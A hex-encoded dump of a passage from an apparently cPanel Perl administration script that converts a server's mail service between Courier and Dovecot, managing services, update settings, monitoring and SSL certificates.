5F 72 65 66 2D 3E 7B 27 6D 61 69 6C 73 65 72 <br>76 65 72 27 7D 3B 0A 6D 79 20 24 63 75 72 72 65 6E 74 5F 6D 61 69 6C 73 <br>65 72 76 65 72 20 3D 20 43 70 61 6E 65 6C 3A 3A 53 65 72 76 69 63 65 73 <br>3A 3A 69 73 5F 65 6E 61 62 6C 65 64 28 27 6D 61 69 6C 27 29 20 3F 20 24 <br>63 70 63 6F 6E 66 5F 72 65 66 2D 3E 7B 27 6D 61 69 6C 73 65 72 76 65 72 <br>27 7D 20 3A 20 27 64 69 73 61 62 6C 65 64 27 3B 0A 0A 69 66 20 28 24 63 <br>75 72 72 65 6E 74 29 20 7B 0A 20 20 20 20 70 72 69 6E 74 20 22 43 75 72 <br>72 65 6E 74 20 6D 61 69 6C 73 65 72 76 65 72 20 74 79 70 65 3A 20 24 7B <br>63 75 72 72 65 6E 74 5F 6D 61 69 6C 73 65 72 76 65 72 7D 5C 6E 22 3B 0A <br>20 20 20 20 70 72 69 6E 74 20 22 43 75 72 72 65 6E 74 20 73 74 6F 72 61 <br>67 65 20 66 6F 72 6D 61 74 3A 20 24 7B 73 74 6F 72 61 67 65 5F 74 79 70 <br>65 7D 5C 6E 22 3B 0A 20 20 20 20 65 78 69 74 20 30 3B 0A 7D 0A 0A 69 66 <br>20 28 20 24 73 74 6F 72 61 67 65 5F 74 79 70 65 20 65 71 20 27 6D 62 6F <br>78 27 20 29 20 7B 0A 20 20 20 20 69 66 20 28 20 24 73 65 6C 65 63 74 65 <br>64 5F 6D 61 69 6C 73 65 72 76 65 72 20 65 71 20 27 63 70 70 6F 70 27 20 <br>29 20 7B 0A 20 20 20 20 20 20 20 20 70 72 69 6E 74 20 22 41 6C 72 65 61 <br>64 79 20 63 6F 6E 66 69 67 75 72 65 64 2E 5C 6E 22 3B 0A 20 20 20 20 7D <br>0A 20 20 20 20 65 6C 73 65 20 7B 0A 20 20 20 20 20 20 20 20 70 72 69 6E <br>74 20 22 42 65 66 6F 72 65 20 73 65 6C 65 63 74 69 6E 67 20 61 20 6E 65 <br>77 20 6D 61 69 6C 20 73 65 72 76 65 72 20 79 6F 75 20 6D 75 73 74 20 66 <br>69 72 73 74 20 63 6F 6E 76 65 72 74 5C 6E 22 3B 0A 20 20 20 20 20 20 20 <br>20 70 72 69 6E 74 20 22 74 6F 20 74 68 65 20 6D 61 69 6C 64 69 72 20 73 <br>74 6F 72 61 67 65 20 66 6F 72 6D 61 74 20 75 73 69 6E 67 20 2F 73 63 72 <br>69 70 74 73 2F 63 6F 6E 76 65 72 74 32 6D 61 69 6C 64 69 72 5C 6E 22 3B <br>0A 20 20 20 20 7D 0A 20 20 20 20 65 78 69 74 20 30 3B 0A 7D 0A 0A 69 66 <br>20 28 20 21 24 66 6F 72 63 65 20 26 26 20 24 63 75 72 72 65 6E 74 5F 6D <br>61 69 6C 73 65 72 76 65 72 20 65 71 20 24 73 65 6C 65 63 74 65 64 5F 6D <br>61 69 6C 73 65 72 76 65 72 20 29 20 7B 0A 20 20 20 20 70 72 69 6E 74 20 <br>22 41 6C 72 65 61 64 79 20 63 6F 6E 66 69 67 75 72 65 64 2E 5C 6E 22 3B <br>0A 20 20 20 20 65 78 69 74 20 30 3B 0A 7D 0A 0A 75 6E 6C 65 73 73 20 28 <br>20 24 73 65 6C 65 63 74 65 64 5F 6D 61 69 6C 73 65 72 76 65 72 20 65 71 <br>20 27 64 6F 76 65 63 6F 74 27 20 7C 7C 20 24 73 65 6C 65 63 74 65 64 5F <br>6D 61 69 6C 73 65 72 76 65 72 20 65 71 20 27 63 6F 75 72 69 65 72 27 20 <br>7C 7C 20 24 73 65 6C 65 63 74 65 64 5F 6D 61 69 6C 73 65 72 76 65 72 20 <br>65 71 20 27 64 69 73 61 62 6C 65 64 27 20 29 20 7B 0A 20 20 20 20 70 72 <br>69 6E 74 20 22 55 6E 6B 6E 6F 77 6E 20 6D 61 69 6C 73 65 72 76 65 72 20 <br>74 79 70 65 20 73 70 65 63 69 66 69 65 64 2E 5C 6E 54 72 79 20 24 30 20 <br>2D 2D 68 65 6C 70 5C 6E 22 3B 0A 20 20 20 20 65 78 69 74 20 31 3B 0A 7D <br>0A 0A 69 66 20 28 20 24 3E 20 21 3D 20 30 20 29 20 7B 0A 20 20 20 20 64 <br>69 65 20 22 43 6F 6E 76 65 72 73 69 6F 6E 20 70 72 6F 63 65 73 73 20 6D <br>75 73 74 20 62 65 20 70 65 72 66 6F 72 6D 65 64 20 61 73 20 72 6F 6F 74 <br>22 3B 0A 7D 0A 0A 6D 79 20 24 70 69 64 5F 6F 62 6A 20 3D 20 43 70 61 6E <br>65 6C 3A 3A 50 49 44 2D 3E 6E 65 77 28 20 7B 20 27 70 69 64 5F 66 69 6C <br>65 27 20 3D 3E 20 27 2F 76 61 72 2F 72 75 6E 2F 73 65 74 75 70 6D 61 69 <br>6C 73 65 72 76 65 72 2E 70 69 64 27 20 7D 20 29 3B 0A 75 6E 6C 65 73 73 <br>20 28 20 24 70 69 64 5F 6F 62 6A 2D 3E 63 72 65 61 74 65 5F 70 69 64 5F <br>66 69 6C 65 28 29 20 3E 20 30 20 29 20 7B 0A 20 20 20 20 70 72 69 6E 74 <br>20 22 53 65 74 75 70 6D 61 69 6C 73 65 72 76 65 72 20 61 70 70 65 61 72 <br>73 20 74 6F 20 62 65 20 72 75 6E 6E 69 6E 67 20 61 6C 72 65 61 64 79 2E <br>5C 6E 22 3B 0A 20 20 20 20 70 72 69 6E 74 20 22 50 6C 65 61 73 65 20 77 <br>61 69 74 20 66 6F 72 20 74 68 65 20 63 6F 6E 76 65 72 73 69 6F 6E 20 74 <br>6F 20 66 69 6E 69 73 68 20 62 65 66 6F 72 65 20 61 74 74 65 6D 70 74 69 <br>6E 67 20 61 6E 6F 74 68 65 72 2E 5C 6E 22 3B 0A 20 20 20 20 65 78 69 74 <br>20 31 3B 0A 7D 0A 0A 24 63 70 63 6F 6E 66 5F 72 65 66 2D 3E 7B 27 6D 61 <br>69 6C 73 65 72 76 65 72 27 7D 20 3D 20 24 73 65 6C 65 63 74 65 64 5F 6D <br>61 69 6C 73 65 72 76 65 72 20 69 66 20 28 20 24 73 65 6C 65 63 74 65 64 <br>5F 6D 61 69 6C 73 65 72 76 65 72 20 6E 65 20 27 64 69 73 61 62 6C 65 64 <br>27 20 29 3B 0A 43 70 61 6E 65 6C 3A 3A 43 6F 6E 66 69 67 3A 3A 73 61 76 <br>65 63 70 63 6F 6E 66 28 24 63 70 63 6F 6E 66 5F 72 65 66 29 3B 0A 6D 79 <br>20 24 64 69 73 74 72 6F 20 20 20 20 20 20 3D 20 43 70 61 6E 65 6C 3A 3A <br>53 79 73 3A 3A 4F 53 3A 3A 67 65 74 6F 73 28 29 3B 0A 6D 79 20 24 69 6E <br>69 74 20 20 20 20 20 20 20 20 3D 20 43 70 61 6E 65 6C 3A 3A 49 6E 69 74 <br>2D 3E 6E 65 77 28 29 3B 0A 6D 79 20 24 65 72 72 6F 72 5F 63 6F 75 6E 74 <br>20 3D 20 30 3B 0A 0A 23 62 72 61 6E 63 68 20 74 6F 20 75 6E 69 6E 73 61 <br>6C 6C 2F 69 6E 73 74 61 6C 6C 20 66 75 6E 63 74 69 6F 6E 73 0A 64 69 73 <br>61 62 6C 65 5F 63 68 6B 73 72 76 64 5F 6D 6F 6E 69 74 6F 72 69 6E 67 28 <br>29 3B 0A 0A 69 66 20 28 20 24 73 65 6C 65 63 74 65 64 5F 6D 61 69 6C 73 <br>65 72 76 65 72 20 65 71 20 27 63 6F 75 72 69 65 72 27 20 29 20 7B 0A 20 <br>20 20 20 64 69 73 61 62 6C 65 5F 6E 6F 6E 65 28 29 3B 0A 20 20 20 20 64 <br>69 73 61 62 6C 65 5F 64 6F 76 65 63 6F 74 28 29 3B 0A 20 20 20 20 65 6E <br>61 62 6C 65 5F 63 6F 75 72 69 65 72 28 29 3B 0A 20 20 20 20 65 6E 61 62 <br>6C 65 5F 63 68 6B 73 72 76 64 5F 6D 6F 6E 69 74 6F 72 69 6E 67 28 29 3B <br>0A 7D 0A 65 6C 73 69 66 20 28 20 24 73 65 6C 65 63 74 65 64 5F 6D 61 69 <br>6C 73 65 72 76 65 72 20 65 71 20 27 64 6F 76 65 63 6F 74 27 20 29 20 7B <br>0A 20 20 20 20 64 69 73 61 62 6C 65 5F 6E 6F 6E 65 28 29 3B 0A 20 20 20 <br>20 64 69 73 61 62 6C 65 5F 63 6F 75 72 69 65 72 28 29 3B 0A 20 20 20 20 <br>65 6E 61 62 6C 65 5F 64 6F 76 65 63 6F 74 28 29 3B 0A 20 20 20 20 65 6E <br>61 62 6C 65 5F 63 68 6B 73 72 76 64 5F 6D 6F 6E 69 74 6F 72 69 6E 67 28 <br>29 3B 0A 7D 0A 65 6C 73 65 20 7B 0A 20 20 20 20 65 6E 61 62 6C 65 5F 6E <br>6F 6E 65 28 29 3B 0A 20 20 20 20 64 69 73 61 62 6C 65 5F 64 6F 76 65 63 <br>6F 74 28 29 3B 0A 20 20 20 20 64 69 73 61 62 6C 65 5F 63 6F 75 72 69 65 <br>72 28 29 3B 0A 7D 0A 0A 72 65 63 6F 6E 66 69 67 75 72 65 5F 65 78 69 6D <br>28 29 3B 0A 72 75 6E 5F 66 61 73 74 6D 61 69 6C 28 29 3B 0A 24 70 69 64 <br>5F 6F 62 6A 2D 3E 72 65 6D 6F 76 65 5F 70 69 64 5F 66 69 6C 65 28 29 3B <br>0A 69 66 20 28 24 65 72 72 6F 72 5F 63 6F 75 6E 74 29 20 7B 0A 20 20 20 <br>20 70 72 69 6E 74 20 22 5C 6E 57 41 52 4E 49 4E 47 3A 20 53 6F 6D 65 20 <br>65 72 72 6F 72 73 20 65 6E 63 6F 75 6E 74 65 72 65 64 20 64 75 72 69 6E <br>67 20 74 68 65 20 63 6F 6E 76 65 72 73 69 6F 6E 20 70 72 6F 63 65 73 73 <br>5C 6E 22 3B 0A 20 20 20 20 65 78 69 74 20 31 3B 0A 7D 0A 65 6C 73 65 20 <br>7B 0A 20 20 20 20 70 72 69 6E 74 20 22 5C 6E 4D 61 69 6C 73 65 72 76 65 <br>72 20 63 6F 6E 76 65 72 73 69 6F 6E 20 63 6F 6D 70 6C 65 74 65 5C 6E 22 <br>3B 0A 20 20 20 20 65 78 69 74 20 30 3B 0A 7D 0A 0A 73 75 62 20 72 75 6E <br>5F 66 61 73 74 6D 61 69 6C 20 7B 0A 20 20 20 20 73 79 73 74 65 6D 20 27 <br>2F 73 63 72 69 70 74 73 2F 66 61 73 74 6D 61 69 6C 27 3B 0A 7D 0A 0A 73 <br>75 62 20 64 69 73 61 62 6C 65 5F 6E 6F 6E 65 20 7B 0A 20 20 20 20 75 6E <br>6C 69 6E 6B 20 27 2F 65 74 63 2F 69 6D 61 70 64 69 73 61 62 6C 65 27 20 <br>20 20 69 66 20 28 20 2D 65 20 27 2F 65 74 63 2F 69 6D 61 70 64 69 73 61 <br>62 6C 65 27 20 29 3B 0A 20 20 20 20 75 6E 6C 69 6E 6B 20 27 2F 65 74 63 <br>2F 63 70 69 6D 61 70 64 69 73 61 62 6C 65 27 20 69 66 20 28 20 2D 65 20 <br>27 2F 65 74 63 2F 63 70 69 6D 61 70 64 69 73 61 62 6C 65 27 20 29 3B 0A <br>20 20 20 20 75 6E 6C 69 6E 6B 20 27 2F 65 74 63 2F 69 6D 61 70 64 64 69 <br>73 61 62 6C 65 27 20 20 69 66 20 28 20 2D 65 20 27 2F 65 74 63 2F 69 6D <br>61 70 64 64 69 73 61 62 6C 65 27 20 29 3B 0A 7D 0A 0A 73 75 62 20 64 69 <br>73 61 62 6C 65 5F 64 6F 76 65 63 6F 74 20 7B 0A 20 20 20 20 70 72 69 6E <br>74 20 22 5C 6E 48 61 6C 74 69 6E 67 20 44 6F 76 65 63 6F 74 5C 6E 22 3B <br>0A 20 20 20 20 6D 79 20 24 6F 75 74 70 75 74 20 3D 20 24 69 6E 69 74 2D <br>3E 72 75 6E 5F 63 6F 6D 6D 61 6E 64 28 20 27 64 6F 76 65 63 6F 74 27 2C <br>20 27 73 74 6F 70 27 20 29 3B 0A 20 20 20 20 70 72 69 6E 74 20 22 5C 6E <br>44 69 73 61 62 6C 69 6E 67 20 44 6F 76 65 63 6F 74 20 69 6E 20 69 6E 69 <br>74 20 73 79 73 74 65 6D 5C 6E 22 3B 0A 20 20 20 20 24 6F 75 74 70 75 74 <br>20 3D 20 24 69 6E 69 74 2D 3E 72 75 6E 5F 63 6F 6D 6D 61 6E 64 5F 66 6F <br>72 5F 6F 6E 65 28 20 27 64 69 73 61 62 6C 65 27 2C 20 27 64 6F 76 65 63 <br>6F 74 27 20 29 3B 0A 7D 0A 0A 73 75 62 20 64 69 73 61 62 6C 65 5F 63 6F <br>75 72 69 65 72 20 7B 0A 20 20 20 20 70 72 69 6E 74 20 22 5C 6E 48 61 6C <br>74 69 6E 67 20 43 6F 75 72 69 65 72 5C 6E 22 3B 0A 20 20 20 20 6D 79 20 <br>40 73 65 72 76 69 63 65 73 20 3D 20 71 77 28 63 6F 75 72 69 65 72 2D 69 <br>6D 61 70 20 63 6F 75 72 69 65 72 2D 61 75 74 68 6C 69 62 29 3B 0A 20 20 <br>20 20 69 66 20 28 20 24 64 69 73 74 72 6F 20 65 71 20 27 66 72 65 65 62 <br>73 64 27 20 29 20 7B 0A 20 20 20 20 20 20 20 20 40 73 65 72 76 69 63 65 <br>73 20 3D 20 71 77 28 63 6F 75 72 69 65 72 2D 69 6D 61 70 2D 70 6F 70 33 <br>64 20 63 6F 75 72 69 65 72 2D 69 6D 61 70 2D 70 6F 70 33 64 2D 73 73 6C <br>20 63 6F 75 72 69 65 72 2D 69 6D 61 70 2D 69 6D 61 70 64 20 63 6F 75 72 <br>69 65 72 2D 69 6D 61 70 2D 69 6D 61 70 64 2D 73 73 6C 20 63 6F 75 72 69 <br>65 72 2D 61 75 74 68 64 61 65 6D 6F 6E 64 29 3B 0A 20 20 20 20 7D 0A 20 <br>20 20 20 66 6F 72 65 61 63 68 20 6D 79 20 24 73 65 72 76 69 63 65 20 28 <br>40 73 65 72 76 69 63 65 73 29 20 7B 0A 20 20 20 20 20 20 20 20 6D 79 20 <br>24 6F 75 74 70 75 74 20 3D 20 24 69 6E 69 74 2D 3E 72 75 6E 5F 63 6F 6D <br>6D 61 6E 64 28 20 24 73 65 72 76 69 63 65 2C 20 27 73 74 6F 70 27 20 29 <br>3B 0A 20 20 20 20 7D 0A 20 20 20 20 70 72 69 6E 74 20 22 5C 6E 44 69 73 <br>61 62 6C 69 6E 67 20 43 6F 75 72 69 65 72 20 69 6E 20 69 6E 69 74 20 73 <br>79 73 74 65 6D 5C 6E 22 3B 0A 20 20 20 20 66 6F 72 65 61 63 68 20 6D 79 <br>20 24 73 65 72 76 69 63 65 20 28 40 73 65 72 76 69 63 65 73 29 20 7B 0A <br>20 20 20 20 20 20 20 20 6D 79 20 24 6F 75 74 70 75 74 20 3D 20 24 69 6E <br>69 74 2D 3E 72 75 6E 5F 63 6F 6D 6D 61 6E 64 5F 66 6F 72 5F 6F 6E 65 28 <br>20 27 64 69 73 61 62 6C 65 27 2C 20 24 73 65 72 76 69 63 65 20 29 3B 0A <br>20 20 20 20 7D 0A 7D 0A 0A 23 20 53 74 72 69 63 74 6C 79 20 73 70 65 61 <br>6B 69 6E 67 2C 20 74 6F 75 63 68 69 6E 67 20 2F 65 74 63 2F 69 6D 61 70 <br>64 69 73 61 62 6C 65 20 77 69 6C 6C 20 63 61 75 73 65 20 63 68 6B 73 72 <br>76 64 20 74 6F 20 73 6B 69 70 20 6F 76 65 72 0A 23 20 72 65 73 74 61 72 <br>74 69 6E 67 20 44 6F 76 65 63 6F 74 20 6F 72 20 43 6F 75 72 69 65 72 2C <br>20 62 75 74 20 74 68 69 73 20 77 69 6C 6C 20 73 74 6F 70 20 69 74 20 66 <br>72 6F 6D 20 65 76 65 6E 20 70 6F 6C 6C 69 6E 67 20 66 6F 72 20 74 68 65 <br>73 65 20 70 72 6F 63 65 73 73 65 73 0A 73 75 62 20 64 69 73 61 62 6C 65 <br>5F 63 68 6B 73 72 76 64 5F 6D 6F 6E 69 74 6F 72 69 6E 67 20 7B 0A 20 20 <br>20 20 6D 79 20 25 6D 6F 6E 69 74 6F 72 65 64 5F 73 65 72 76 69 63 65 73 <br>20 3D 20 43 70 61 6E 65 6C 3A 3A 43 68 6B 73 65 72 76 64 3A 3A 67 65 74 <br>6D 6F 6E 69 74 6F 72 65 64 28 29 3B 0A 20 20 20 20 69 66 20 28 20 21 24 <br>6D 6F 6E 69 74 6F 72 65 64 5F 73 65 72 76 69 63 65 73 7B 27 69 6D 61 70 <br>27 7D 20 26 26 20 21 24 6D 6F 6E 69 74 6F 72 65 64 5F 73 65 72 76 69 63 <br>65 73 7B 27 70 6F 70 27 7D 20 29 20 7B 0A 20 20 20 20 20 20 20 20 70 72 <br>69 6E 74 20 22 5C 6E 43 68 6B 73 72 76 64 20 6D 6F 6E 69 74 6F 72 69 6E <br>67 20 69 73 20 64 69 73 61 62 6C 65 64 5C 6E 22 3B 0A 20 20 20 20 7D 0A <br>20 20 20 20 65 6C 73 65 20 7B 0A 20 20 20 20 20 20 20 20 70 72 69 6E 74 <br>20 22 5C 6E 44 69 73 61 62 6C 69 6E 67 20 43 68 6B 73 72 76 64 20 6D 6F <br>6E 69 74 6F 72 69 6E 67 5C 6E 22 3B 0A 20 20 20 20 20 20 20 20 43 70 61 <br>6E 65 6C 3A 3A 43 68 6B 73 65 72 76 64 3A 3A 64 69 73 61 62 6C 65 28 27 <br>69 6D 61 70 27 29 3B 0A 20 20 20 20 20 20 20 20 43 70 61 6E 65 6C 3A 3A <br>43 68 6B 73 65 72 76 64 3A 3A 64 69 73 61 62 6C 65 28 27 70 6F 70 27 29 <br>3B 0A 20 20 20 20 20 20 20 20 73 79 73 74 65 6D 28 27 2F 73 63 72 69 70 <br>74 73 2F 72 65 73 74 61 72 74 73 72 76 5F 63 68 6B 73 72 76 64 27 29 3B <br>0A 20 20 20 20 7D 0A 7D 0A 0A 73 75 62 20 65 6E 61 62 6C 65 5F 6E 6F 6E <br>65 20 7B 0A 20 20 20 20 73 79 73 74 65 6D 28 20 27 74 6F 75 63 68 27 2C <br>20 27 2F 65 74 63 2F 69 6D 61 70 64 69 73 61 62 6C 65 27 20 29 3B 0A 20 <br>20 20 20 70 72 69 6E 74 20 22 5C 6E 44 69 73 61 62 6C 69 6E 67 20 6D 61 <br>69 6C 20 73 65 72 76 65 72 20 75 70 64 61 74 65 73 5C 6E 22 3B 0A 20 20 <br>20 20 6D 79 20 24 75 70 64 61 74 65 63 6F 6E 66 20 3D 20 43 70 61 6E 65 <br>6C 3A 3A 55 70 64 61 74 65 3A 3A 6C 6F 61 64 75 70 64 61 74 65 63 6F 6E <br>66 69 67 28 29 3B 0A 20 20 20 20 24 75 70 64 61 74 65 63 6F 6E 66 2D 3E <br>7B 27 43 4F 55 52 49 45 52 55 50 27 7D 20 3D 20 27 6E 65 76 65 72 27 3B <br>0A 20 20 20 20 24 75 70 64 61 74 65 63 6F 6E 66 2D 3E 7B 27 44 4F 56 45 <br>43 4F 54 55 50 27 7D 20 3D 20 27 6E 65 76 65 72 27 3B 0A 20 20 20 20 43 <br>70 61 6E 65 6C 3A 3A 55 70 64 61 74 65 3A 3A 73 61 76 65 75 70 64 61 74 <br>65 63 6F 6E 66 69 67 28 24 75 70 64 61 74 65 63 6F 6E 66 29 3B 0A 7D 0A <br>0A 73 75 62 20 65 6E 61 62 6C 65 5F 64 6F 76 65 63 6F 74 20 7B 0A 20 20 <br>20 20 70 72 69 6E 74 20 22 5C 6E 43 68 65 63 6B 69 6E 67 20 74 68 61 74 <br>20 44 6F 76 65 63 6F 74 20 69 73 20 75 70 20 74 6F 20 64 61 74 65 5C 6E <br>22 3B 0A 20 20 20 20 6D 79 20 24 75 70 64 61 74 65 63 6F 6E 66 20 20 20 <br>20 20 20 3D 20 43 70 61 6E 65 6C 3A 3A 55 70 64 61 74 65 3A 3A 6C 6F 61 <br>64 75 70 64 61 74 65 63 6F 6E 66 69 67 28 29 3B 0A 20 20 20 20 6D 79 20 <br>25 6F 72 69 67 5F 75 70 64 61 74 65 63 6F 6E 66 20 3D 20 25 7B 24 75 70 <br>64 61 74 65 63 6F 6E 66 7D 3B 0A 20 20 20 20 24 75 70 64 61 74 65 63 6F <br>6E 66 2D 3E 7B 27 43 4F 55 52 49 45 52 55 50 27 7D 20 3D 20 27 6E 65 76 <br>65 72 27 3B 0A 20 20 20 20 24 75 70 64 61 74 65 63 6F 6E 66 2D 3E 7B 27 <br>44 4F 56 45 43 4F 54 55 50 27 7D 20 3D 20 27 64 61 69 6C 79 27 3B 0A 20 <br>20 20 20 24 75 70 64 61 74 65 63 6F 6E 66 2D 3E 7B 27 53 59 53 55 50 27 <br>7D 20 20 20 20 20 3D 20 27 64 61 69 6C 79 27 3B 0A 20 20 20 20 43 70 61 <br>6E 65 6C 3A 3A 55 70 64 61 74 65 3A 3A 73 61 76 65 75 70 64 61 74 65 63 <br>6F 6E 66 69 67 28 24 75 70 64 61 74 65 63 6F 6E 66 29 3B 0A 20 20 20 20 <br>6D 79 20 40 64 6F 76 65 63 6F 74 75 70 20 3D 20 28 27 2F 73 63 72 69 70 <br>74 73 2F 64 6F 76 65 63 6F 74 75 70 27 29 3B 0A 20 20 20 20 70 75 73 68 <br>20 40 64 6F 76 65 63 6F 74 75 70 2C 20 27 2D 2D 66 6F 72 63 65 27 20 69 <br>66 20 28 24 66 6F 72 63 65 29 3B 0A 20 20 20 20 73 79 73 74 65 6D 28 40 <br>64 6F 76 65 63 6F 74 75 70 29 3B 0A 0A 20 20 20 20 75 6E 6C 65 73 73 20 <br>28 20 24 73 6B 69 70 5F 6D 61 69 6C 64 69 72 5F 63 6F 6E 76 65 72 73 69 <br>6F 6E 20 7C 7C 20 28 20 21 24 66 6F 72 63 65 20 26 26 20 24 6C 61 73 74 <br>5F 61 63 74 69 76 65 5F 6D 61 69 6C 73 65 72 76 65 72 20 65 71 20 27 64 <br>6F 76 65 63 6F 74 27 20 29 20 29 20 7B 0A 20 20 20 20 20 20 20 20 70 72 <br>69 6E 74 20 22 5C 6E 43 6F 6E 76 65 72 74 69 6E 67 20 75 73 65 72 20 6D <br>61 69 6C 64 69 72 73 20 74 6F 20 44 6F 76 65 63 6F 74 20 66 6F 72 6D 61 <br>74 2E 2E 2E 5C 6E 22 3B 0A 20 20 20 20 20 20 20 20 73 79 73 74 65 6D 28 <br>27 2F 73 63 72 69 70 74 73 2F 6D 61 69 6C 64 69 72 5F 63 6F 6E 76 65 72 <br>74 65 72 20 2D 2D 66 6F 72 72 65 61 6C 20 2D 2D 6F 76 65 72 77 72 69 74 <br>65 20 2D 2D 74 6F 2D 64 6F 76 65 63 6F 74 27 29 3B 0A 20 20 20 20 20 20 <br>20 20 24 65 72 72 6F 72 5F 63 6F 75 6E 74 2B 2B 20 69 66 20 28 24 3F 29 <br>3B 0A 20 20 20 20 7D 0A 0A 20 20 20 20 70 72 69 6E 74 20 22 5C 6E 43 68 <br>65 63 6B 69 6E 67 20 53 53 4C 20 63 65 72 74 2E 2E 2E 22 3B 0A 20 20 20 <br>20 6D 79 20 24 64 6F 76 65 63 6F 74 5F 63 65 72 74 5F 72 65 66 20 3D 20 <br>43 70 61 6E 65 6C 3A 3A 53 53 4C 43 65 72 74 73 3A 3A 66 65 74 63 68 53 <br>53 4C 46 69 6C 65 73 28 20 27 73 65 72 76 69 63 65 27 20 3D 3E 20 27 64 <br>6F 76 65 63 6F 74 27 20 29 3B 0A 20 20 20 20 75 6E 6C 65 73 73 20 28 20 <br>24 64 6F 76 65 63 6F 74 5F 63 65 72 74 5F 72 65 66 2D 3E 7B 27 63 72 74 <br>27 7D 20 29 20 7B 0A 20 20 20 20 20 20 20 20 70 72 69 6E 74 20 22 6D 69 <br>73 73 69 6E 67 5C 6E 22 3B 0A 20 20 20 20 20 20 20 20 70 72 69 6E 74 20 <br>22 47 65 6E 65 72 61 74 69 6E 67 20 64 65 66 61 75 6C 74 20 63 65 72 74 <br>2E 2E 2E 22 3B 0A 20 20 20 20 20 20 20 20 6F 70 65 6E 20 4F 4C 44 53 54 <br>44 45 52 52 2C 20 27 3E 26 53 54 44 45 52 52 27 3B 0A 20 20 20 20 20 20 <br>20 20 6F 70 65 6E 20 53 54 44 45 52 52 2C 20 27 3E 27 2C 20 27 2F 64 65 <br>76 2F 6E 75 6C 6C 27 3B 0A 20 20 20 20 20 20 20 20 43 70 61 6E 65 6C 3A <br>3A 53 53 4C 43 65 72 74 73 3A 3A 63 72 65 61 74 65 44 65 66 61 75 6C 74 <br>53 53 4C 46 69 6C 65 73 28 20 27 73 65 72 76 69 63 65 27 20 3D 3E 20 27 <br>64 6F 76 65 63 6F 74 27 20 29 3B 0A 20 20 20 20 20 20 20 20 6F 70 65 6E <br>20 53 54 44 45 52 52 2C 20 27 3E 26 4F 4C 44 53 54 44 45 52 52 27 3B 0A <br>20 20 20 20 20 20 20 20 70 72 69 6E 74 20 22 64 6F 6E 65 5C 6E 22 3B 0A <br>20 20 20 20 20 20 20 20 6D 79 20 24 63 6F 75 72 69 65 72 5F 63 65 72 74 <br>5F 72 65 66 20 3D 20 43 70 61 6E 65 6C 3A 3A 53 53 4C 43 65 72 74 73 3A <br>3A 66 65 74 63 68 53 53 4C 46 69 6C 65 73 28 20 27 73 65 72 76 69 63 65 <br>27 20 3D 3E 20 27 63 6F 75 72 69 65 72 2D 69 6D 61 70 64 27 20 29 3B 0A <br>0A 20 20 20 20 20 20 20 20 69 66 20 28 20 24 63 6F 75 72 69 65 72 5F 63 <br>65 72 74 5F 72 65 66 2D 3E 7B 27 63 72 74 27 7D 20 29 20 7B 0A 20 20 20 <br>20 20 20 20 20 20 20 20 20 70 72 69 6E 74 20 22 52 65 75 73 69 6E 67 20 <br>65 78 69 73 74 69 6E 67 20 43 6F 75 72 69 65 72 2D 49 4D 41 50 20 63 65 <br>72 74 2E 2E 2E 22 3B 0A 20 20 20 20 20 20 20 20 20 20 20 20 24 63 6F 75 <br>72 69 65 72 5F 63 65 72 74 5F 72 65 66 2D 3E 7B 27 73 65 72 76 69 63 65 <br>27 7D 20 3D 20 27 64 6F 76 65 63 6F 74 27 3B 0A 20 20 20 20 20 20 20 20 <br>20 20 20 20 24 63 6F 75 72 69 65 72 5F 63 65 72 74 5F 72 65 66 2D 3E 7B <br>27 71 75 69 65 74 27 7D 20 20 20 3D 20 31 3B 0A 20 20 20 20 20 20 20 20 <br>20 20 20 20 6D 79 20 40 72 65 73 75 6C 74 20 3D 20 43 70 61 6E 65 6C 3A <br>3A 53 53 4C 43 65 72 74 73 3A 3A 69 6E 73 74 61 6C 6C 53 53 4C 46 69 6C <br>65 73 28 20 25 7B 24 63 6F 75 72 69 65 72 5F 63 65 72 74 5F 72 65 66 7D <br>20 29 3B 0A 20 20 20 20 20 20 20 20 20 20 20 20 70 72 69 6E 74 20 22 64 <br>6F 6E 65 5C 6E 22 3B 0A 20 20 20 20 20 20 20 20 7D 0A 20 20 20 20 7D 0A <br>20 20 20 20 65 6C 73 65 20 7B 0A 20 20 20 20 20 20 20 20 70 72 69 6E 74 <br>20 22 64 6F 6E 65 5C 6E 22 3B 0A 20 20 20 20 7D 0A 0A 20 20 20 20 70 72 <br>69 6E 74 20 22 5C 6E 43 68 65 63 6B 69 6E 67 20 66 6F 72 20 65 78 70 69 <br>72 65 64 20 53 53 4C 20 63 65 72 74 73 2E 2E 2E 22 3B 0A 20 20 20 20 73 <br>79 73 74 65 6D 20 27 2F 75 73 72 2F 6C 6F 63 61 6C 2F 63 70 61 6E 65 6C <br>2F 62 69 6E 2F 63 68 65 63 6B 61 6C 6C 73 73 6C 63 65 72 74 73 27 3B 0A <br>20 20 20 20 70 72 69 6E 74 20 22 64 6F 6E 65 5C 6E 22 3B 0A 0A 20 20 20 <br>20 70 72 69 6E 74 20 22 5C 6E 45 6E 61 62 6C 69 6E 67 20 44 6F 76 65 63 <br>6F 74 20 69 6E 20 69 6E 69 74 20 73 79 73 74 65 6D 5C 6E 22 3B 0A 20 20 <br>20 20 6D 79 20 24 6F 75 74 70 75 74 20 3D 20 24 69 6E 69 74 2D 3E 72 75 <br>6E 5F 63 6F 6D 6D 61 6E 64 5F 66 6F 72 5F 6F 6E 65 28 20 27 65 6E 61 62 <br>6C 65 27 2C 20 27 64 6F 76 65 63 6F 74 27 20 29 3B 0A 20 20 20 20 70 72 <br>69 6E 74 20 22 5C 6E 53 74 61 72 74 69 6E 67 20 44 6F 76 65 63 6F 74 5C <br>6E 22 3B 0A 20 20 20 20 24 6F 75 74 70 75 74 20 3D 20 24 69 6E 69 74 2D <br>3E 72 75 6E 5F 63 6F 6D 6D 61 6E 64 28 20 27 64 6F 76 65 63 6F 74 27 2C <br>20 27 73 74 61 72 74 27 20 29 3B 0A 20 20 20 20 70 72 69 6E 74 20 22 5C <br>6E 45 6E 61 62 6C 69 6E 67 20 44 6F 76 65 63 6F 74 20 75 70 64 61 74 65 <br>73 5C 6E 22 3B 0A 20 20 20 20 24 6F 72 69 67 5F 75 70 64 61 74 65 63 6F <br>6E 66 7B 27 44 4F 56 45 43 4F 54 55 50 27 7D 20 3D 20 27 69 6E 68 65 72 <br>69 74 27 3B 0A 20 20 20 20 24 6F 72 69 67 5F 75 70 64 61 74 65 63 6F 6E <br>66 7B 27 43 4F 55 52 49 45 52 55 50 27 7D 20 3D 20 27 6E 65 76 65 72 27 <br>3B 0A 20 20 20 20 43 70 61 6E 65 6C 3A 3A 55 70 64 61 74 65 3A 3A 73 61 <br>76 65 75 70 64 61 74 65 